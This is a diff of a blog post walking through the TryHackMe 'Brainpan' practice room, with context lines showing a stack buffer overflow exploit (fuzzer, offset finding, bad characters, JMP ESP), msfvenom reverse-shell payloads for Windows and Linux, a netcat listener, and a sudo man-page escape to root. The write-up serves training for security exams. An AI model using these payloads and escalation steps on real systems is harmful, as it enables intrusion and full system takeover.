@@ -20,7 +20,7 @@ Brainpan is a great OSCP practice room on [TryHackMe](https://tryhackme.com). Th
 
 TryHackMe will assign a dynamic IP as part of the deployment, I've edited my /etc/hosts file with the name of the box and the assigned IP. I started by doing an nmap scan to check what ports are open.
 
-```highlight
+```powershell
 ┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]                                                                                                                             
 └──╼ $sudo nmap -sC -sV -oA nmap/initial brainpan                                                                                                                      
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-10 12:16 BST                                                                                                             
@@ -82,7 +82,7 @@ Nmap done: 1 IP address (1 host up) scanned in 39.85 seconds
 
 Starting with 9999 I use netcat to look at the port.
 
-```highlight
+```powershell
 ┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
 └──╼ $nc brainpan 9999
 _|                            _|                                        
@@ -108,7 +108,7 @@ Port 10000 is a python http server.
 
 Navigating to the page just displays a image about safe coding. Nothing useful in the source either. I ran a gobuster to check for other directories.
 
-```highlight
+```powershell
 ┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
 └──╼ $gobuster dir -u http://brainpan:10000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
 ===============================================================
@@ -150,7 +150,7 @@ Looking at the output from the exe console, the application is copying the input
 
 I have created a very simple python script to fuzz the application. I updated my hosts file to connect to my windows VM rather than TryHackMe for now.
 
-```highlight
+```python
 #!/usr/bin/python3
 
 import sys, socket
@@ -175,7 +175,7 @@ while True:
 
 The script will send 100 A's to the application and will keep increasing the sent characters by 100 on each attempt. If the application crashes the script will fail and print out the length of A's sent at the time of the crash. 
 
-```highlight
+```powershell
 ┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
 └──╼ $sudo python exploit.py
 Fuzzing crashed at 700 bytes
@@ -191,7 +191,7 @@ EIP is showing 41414141 which is AAAA so we have successfully overwrote EIP. If 
 
 The next step is to find the offset of the crash, I have successfully overwrote EIP but I need to determine the offset so I can accurately control the value inputted in to EIP. To find the offset I used the msf pattern create. This will create a cyclic pattern string of characters that I can put in to my script.
 
-```highlight
+```powershell
 ┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
 └──╼ $msf-pattern_create -l 700
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4A
@@ -205,7 +205,7 @@ w1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A
 
 I've updated the script with the string and also removed the while true as we are no longer fuzzing.
 
-```highlight
+```python
 #!/usr/bin/python3
 
 import sys, socket
@@ -235,7 +235,7 @@ Running the script again crashes the application as excepted.
 
 EIP now has a value of 35724134. I use msf pattern offset to determine the EIP offset.
 
-```highlight
+```powershell
 ┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
 └──╼ $msf-pattern_offset -l 700 -q 35724134
 [*] Exact match at offset 524
@@ -243,7 +243,7 @@ EIP now has a value of 35724134. I use msf pattern offset to determine the EIP o
 
 Great the offset is 524. To make sure its correct I've updated the script with a buffer of 524 A's, 4 B's which is what will be shown as 42424242 in EIP and the remaining bytes as D's. Ive also added a slight offset of 4 C's
 
-```highlight
+```python
 #!/usr/bin/python3
 
 import sys, socket
@@ -278,7 +278,7 @@ I now control EIP!
 
 Before I go any further I need to check for bad characters that could break the exploit. To do this I updated the script with the following string. Normally I remove /x00 as this is a null byte and will break the exploit however to show the process of identifying bad characters I have kept it in. 
 
-```highlight
+```powershell
 \x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f
 \x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40
 \x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f
@@ -291,7 +291,7 @@ Before I go any further I need to check for bad characters that could break the 
 
 Ive updated the script with the bad character list.
 
-```highlight
+```python
 #!/usr/bin/python3
 
 import sys, socket
@@ -352,7 +352,7 @@ Again only one with the value 311712f3. x86 architectures stores values in memor
 
 Now I have a JMP ESP value I update the script.
 
-```highlight
+```python
 #!/usr/bin/python3
 
 import sys, socket
@@ -382,7 +382,7 @@ except:
 
 Nearly finished, the last step is to add our payload that will create a reverse shell to our machine. To do this I used msfvenom.
 
-```highlight
+```powershell
 ┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
 └──╼ $msfvenom -p windows/shell_reverse_tcp LHOST=VPN IP LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b "\x00"
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -432,7 +432,7 @@ msfvenom allows for the reverse shell payload to be created which I can add to t
 
 The final exploit script is:
 
-```highlight
+```python
 #!/usr/bin/python3                                                                                                        
                                                                                                                           
 import sys, socket                                                                                                        
@@ -487,7 +487,7 @@ except:
 
 Before I run the script I change the hosts file to point to the machine IP provided by TryHackMe and start a netcat listener.
 
-```highlight
+```powershell
 ┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
 └──╼ $nc -nvlp 4444
 listening on [any] 4444 ...
@@ -503,7 +503,7 @@ We have a shell, the script worked!
 
 Although the main purpose of the machine is to help with buffer overflow we still need to get administrator on the box. Doing some basic enumeration of the box highlights its actually a linux machine and using wine to run the brainpan.exe application. So I update my exploit script with a linux msfvenom payload and get a new shell.
 
-```highlight
+```powershell
 ┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
 └──╼ $msfvenom -p linux/x86/shell_reverse_tcp LHOST=VPN IP LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b "\x00"
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
@@ -525,7 +525,7 @@ unsigned char buf[] =
 
 Now with a new linux shell I enumerate the machine again.
 
-```highlight
+```powershell
 puck@brainpan:/home/puck$ sudo -l
 Matching Defaults entries for puck on this host:
     env_reset, mail_badpass,
@@ -538,7 +538,7 @@ puck@brainpan:/home/puck$
 
 Running sudo -l shows our user 'puck' can run /home/anansi/bin/anansi_util as root with out a password.
 
-```highlight
+```powershell
 puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
 Usage: /home/anansi/bin/anansi_util [action]
 Where [action] is one of:
@@ -550,13 +550,13 @@ puck@brainpan:/home/puck$
 
 Running the utility I get 3 options, manual looks interesting as I can choose a command.
 
-```highlight
+```powershell
 puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual bash
 ```
 
 I am presented with the man page for bash so I can try to break out of the manual by typing: !/bin/bash
 
-```highlight
+```powershell
 root@brainpan:/usr/share/man# id
 uid=0(root) gid=0(root) groups=0(root)
 root@brainpan:/usr/share/man# cd /root
